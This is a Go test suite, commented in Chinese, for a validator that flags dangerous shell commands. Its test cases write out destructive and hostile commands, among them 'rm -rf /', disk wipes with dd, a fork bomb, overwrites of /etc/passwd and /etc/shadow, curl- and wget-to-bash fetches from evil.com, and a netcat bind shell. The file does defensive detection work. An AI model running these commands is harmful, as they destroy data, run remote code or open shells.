package security

import (
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/suite"
)

// SecurityTestSuite 安全检查测试套件
type SecurityTestSuite struct {
	suite.Suite
}

// SetupTest 每个测试前的设置
func (suite *SecurityTestSuite) SetupTest() {
	// 测试前的准备工作，如果需要的话
}

// TestIsDangerousCommand_DangerousCommands 测试危险命令检测
func (suite *SecurityTestSuite) TestIsDangerousCommand_DangerousCommands() {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		// 系统破坏命令
		{
			name:     "rm -rf /",
			command:  "rm -rf /",
			expected: true,
		},
		{
			name:     "rm -rf /home",
			command:  "rm -rf /home",
			expected: true,
		},
		{
			name:     "mkfs",
			command:  "mkfs /dev/sda1",
			expected: true,
		},
		{
			name:     "format",
			command:  "format c:",
			expected: true,
		},
		{
			name:     "fdisk",
			command:  "fdisk /dev/sda",
			expected: true,
		},

		// 系统控制命令
		{
			name:     "shutdown",
			command:  "shutdown -h now",
			expected: true,
		},
		{
			name:     "reboot",
			command:  "reboot",
			expected: true,
		},
		{
			name:     "halt",
			command:  "halt",
			expected: true,
		},
		{
			name:     "poweroff",
			command:  "poweroff",
			expected: true,
		},

		// 用户管理命令
		{
			name:     "useradd",
			command:  "useradd testuser",
			expected: true,
		},
		{
			name:     "userdel",
			command:  "userdel testuser",
			expected: true,
		},
		{
			name:     "passwd",
			command:  "passwd root",
			expected: true,
		},
		{
			name:     "su",
			command:  "su - root",
			expected: true,
		},
		{
			name:     "sudo su",
			command:  "sudo su -",
			expected: true,
		},

		// 网络攻击命令
		{
			name:     "iptables -F",
			command:  "iptables -F",
			expected: true,
		},
		{
			name:     "fork bomb",
			command:  ":(){ :|:& };:",
			expected: true,
		},

		// 设备文件操作
		{
			name:     "dd if=/dev/zero",
			command:  "dd if=/dev/zero of=/dev/sda",
			expected: true,
		},
		{
			name:     "dd if=/dev/random",
			command:  "dd if=/dev/random of=/dev/sda",
			expected: true,
		},
		{
			name:     "redirect to dev sda",
			command:  "echo 'test' > /dev/sda",
			expected: true,
		},

		// 系统关键文件修改
		{
			name:     "modify passwd",
			command:  "echo 'test::0:0:root:/root:/bin/bash' > /etc/passwd",
			expected: true,
		},
		{
			name:     "modify shadow",
			command:  "echo 'test:$6$hash:12345:0:99999:7:::' > /etc/shadow",
			expected: true,
		},
		{
			name:     "chmod 777 /",
			command:  "chmod 777 /",
			expected: true,
		},
		{
			name:     "chown root",
			command:  "chown root:root /etc/passwd",
			expected: true,
		},

		// 后门和恶意软件
		{
			name:     "curl pipe bash",
			command:  "curl http://evil.com/script.sh | bash",
			expected: true,
		},
		{
			name:     "wget pipe bash",
			command:  "wget -O - http://evil.com/shell.sh | bash",
			expected: true,
		},
		{
			name:     "netcat listen",
			command:  "nc -l -p 4444 -e /bin/bash",
			expected: true,
		},
		{
			name:     "netcat listen alternative",
			command:  "netcat -l -p 4444 -e /bin/bash",
			expected: true,
		},
		{
			name:     "direct bash",
			command:  "/bin/bash -i",
			expected: true,
		},

		// 包管理器
		{
			name:     "apt-get install",
			command:  "apt-get install evil-package",
			expected: true,
		},
		{
			name:     "yum install",
			command:  "yum install malware",
			expected: true,
		},
		{
			name:     "pip install",
			command:  "pip install backdoor",
			expected: true,
		},
		{
			name:     "npm install",
			command:  "npm install malicious-module",
			expected: true,
		},

		// 环境变量注入
		{
			name:     "export with command substitution",
			command:  "export PATH=$(echo 'evil'):$PATH",
			expected: true,
		},
		{
			name:     "export with backticks",
			command:  "export VAR=`whoami`",
			expected: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := IsDangerousCommand(tt.command)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s", tt.command)
		})
	}
}

// TestIsDangerousCommand_SafeCommands 测试安全命令
func (suite *SecurityTestSuite) TestIsDangerousCommand_SafeCommands() {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		// 基本安全命令
		{
			name:     "ls",
			command:  "ls -la",
			expected: false,
		},
		{
			name:     "pwd",
			command:  "pwd",
			expected: false,
		},
		{
			name:     "whoami",
			command:  "whoami",
			expected: false,
		},
		{
			name:     "date",
			command:  "date",
			expected: false,
		},
		{
			name:     "echo",
			command:  "echo 'hello world'",
			expected: false,
		},
		{
			name:     "cat",
			command:  "cat file.txt",
			expected: false,
		},

		// 安全的管道操作
		{
			name:     "grep pipe head",
			command:  "ps aux | grep 'process' | head -10",
			expected: false,
		},
		{
			name:     "grep pipe tail",
			command:  "dmesg | grep 'error' | tail -5",
			expected: false,
		},
		{
			name:     "grep pipe wc",
			command:  "ls -la | grep '.txt' | wc -l",
			expected: false,
		},
		{
			name:     "cat pipe grep",
			command:  "cat /var/log/syslog | grep 'error'",
			expected: false,
		},
		{
			name:     "ls pipe grep",
			command:  "ls -la /proc | grep 'cpu'",
			expected: false,
		},
		{
			name:     "find pipe xargs",
			command:  "find /tmp -name '*.log' | xargs rm -f",
			expected: false,
		},

		// 安全的重定向操作
		{
			name:     "redirect to tmp",
			command:  "echo 'test' > /tmp/test.txt",
			expected: false,
		},
		{
			name:     "redirect to current dir",
			command:  "echo 'test' > ./output.txt",
			expected: false,
		},
		{
			name:     "redirect to log file",
			command:  "echo 'log entry' > app.log",
			expected: false,
		},
		{
			name:     "redirect to txt file",
			command:  "echo 'data' > results.txt",
			expected: false,
		},
		{
			name:     "redirect to out file",
			command:  "echo 'output' > program.out",
			expected: false,
		},

		// 开发相关安全命令
		{
			name:     "go build",
			command:  "go build -o app main.go",
			expected: false,
		},
		{
			name:     "go test",
			command:  "go test ./...",
			expected: false,
		},
		{
			name:     "git status",
			command:  "git status",
			expected: false,
		},
		{
			name:     "npm run test",
			command:  "npm run test",
			expected: false,
		},
		{
			name:     "python script",
			command:  "python3 script.py",
			expected: false,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := IsDangerousCommand(tt.command)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s", tt.command)
		})
	}
}

// TestIsDangerousCommand_EdgeCases 测试边界情况
func (suite *SecurityTestSuite) TestIsDangerousCommand_EdgeCases() {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "empty command",
			command:  "",
			expected: false,
		},
		{
			name:     "whitespace only",
			command:  "   \t\n  ",
			expected: false,
		},
		{
			name:     "very long safe command",
			command:  "echo 'This is a very long safe command that should not be flagged as dangerous even though it contains many words and characters that might normally be associated with complex operations but are actually just harmless text output'",
			expected: false,
		},
		{
			name:     "quoted dangerous command",
			command:  "echo 'rm -rf /'",
			expected: true, // 修复：即使危险命令在引号内，仍然应该被检测为危险
		},
		{
			name:     "double quoted dangerous command",
			command:  `echo "shutdown -h now"`,
			expected: true, // 修复：即使危险命令在引号内，仍然应该被检测为危险
		},
		{
			name:     "mixed quotes",
			command:  `echo 'This contains "rm -rf" inside quotes'`,
			expected: false,
		},
		{
			name:     "case insensitive dangerous command",
			command:  "SHUTDOWN -h NOW",
			expected: true,
		},
		{
			name:     "mixed case dangerous command",
			command:  "ShUtDoWn -h now",
			expected: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := IsDangerousCommand(tt.command)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s", tt.command)
		})
	}
}

// TestIsInQuotes 测试引号检查函数
func (suite *SecurityTestSuite) TestIsInQuotes() {
	tests := []struct {
		name     string
		command  string
		pos      int
		expected bool
	}{
		{
			name:     "in single quotes",
			command:  "echo 'hello world'",
			pos:      7,
			expected: true,
		},
		{
			name:     "in double quotes",
			command:  `echo "hello world"`,
			pos:      7,
			expected: true,
		},
		{
			name:     "outside quotes",
			command:  "echo hello world",
			pos:      7,
			expected: false,
		},
		{
			name:     "after closing quote",
			command:  "echo 'hello' world",
			pos:      15,
			expected: false,
		},
		{
			name:     "odd single quotes",
			command:  "echo 'hello world",
			pos:      7,
			expected: true,
		},
		{
			name:     "odd double quotes",
			command:  `echo "hello world`,
			pos:      7,
			expected: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := isInQuotes(tt.command, tt.pos)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s, Pos: %d", tt.command, tt.pos)
		})
	}
}

// TestIsSafePipeUsage 测试安全管道使用检查
func (suite *SecurityTestSuite) TestIsSafePipeUsage() {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "grep head",
			command:  "ps aux | grep process | head -10",
			expected: true,
		},
		{
			name:     "grep tail",
			command:  "dmesg | grep error | tail -5",
			expected: true,
		},
		{
			name:     "grep wc",
			command:  "ls -la | grep '.txt' | wc -l",
			expected: true,
		},
		{
			name:     "cat grep",
			command:  "cat /var/log/syslog | grep 'error'",
			expected: true,
		},
		{
			name:     "ls grep",
			command:  "ls -la /proc | grep 'cpu'",
			expected: true,
		},
		{
			name:     "find xargs",
			command:  "find /tmp -name '*.log' | xargs rm -f",
			expected: true,
		},
		{
			name:     "unsafe pipe",
			command:  "curl http://evil.com | bash",
			expected: false,
		},
		{
			name:     "case insensitive safe pipe",
			command:  "LS -LA | GREP '.TXT' | WC -L",
			expected: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := isSafePipeUsage(tt.command)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s", tt.command)
		})
	}
}

// TestIsSafeRedirectUsage 测试安全重定向使用检查
func (suite *SecurityTestSuite) TestIsSafeRedirectUsage() {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "redirect to tmp",
			command:  "echo 'test' > /tmp/test.txt",
			expected: true,
		},
		{
			name:     "redirect to current dir",
			command:  "echo 'test' > ./output.txt",
			expected: true,
		},
		{
			name:     "redirect to log file",
			command:  "echo 'log entry' > app.log",
			expected: true,
		},
		{
			name:     "redirect to txt file",
			command:  "echo 'data' > results.txt",
			expected: true,
		},
		{
			name:     "redirect to out file",
			command:  "echo 'output' > program.out",
			expected: true,
		},
		{
			name:     "unsafe redirect to system",
			command:  "echo 'test' > /etc/passwd",
			expected: false,
		},
		{
			name:     "unsafe redirect to device",
			command:  "echo 'test' > /dev/sda",
			expected: false,
		},
		{
			name:     "case insensitive safe redirect",
			command:  "ECHO 'TEST' > /TMP/TEST.TXT",
			expected: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			result := isSafeRedirectUsage(tt.command)
			assert.Equal(suite.T(), tt.expected, result, "Command: %s", tt.command)
		})
	}
}

// TestSecurityValidator_Parallel 并发安全测试
func (suite *SecurityTestSuite) TestSecurityValidator_Parallel() {
	// 简单的并发测试，验证函数没有竞态条件
	command := "ls -la"
	
	// 使用WaitGroup来等待所有并发测试完成
	var wg sync.WaitGroup
	const numGoroutines = 10
	const numIterations = 100
	
	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := 0; j < numIterations; j++ {
				result := IsDangerousCommand(command)
				assert.False(suite.T(), result, "Command should be safe: %s", command)
			}
		}()
	}
	
	wg.Wait()
}

// 运行测试套件
func TestSecurityTestSuite(t *testing.T) {
	suite.Run(t, new(SecurityTestSuite))
}

// 基准测试
func BenchmarkIsDangerousCommand_Safe(b *testing.B) {
	command := "ls -la /home/user/documents"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		IsDangerousCommand(command)
	}
}

func BenchmarkIsDangerousCommand_Dangerous(b *testing.B) {
	command := "rm -rf /important/data"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		IsDangerousCommand(command)
	}
}

func BenchmarkIsDangerousCommand_Complex(b *testing.B) {
	command := "find /tmp -name '*.log' | xargs grep 'error' | wc -l > results.txt"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		IsDangerousCommand(command)
	}
}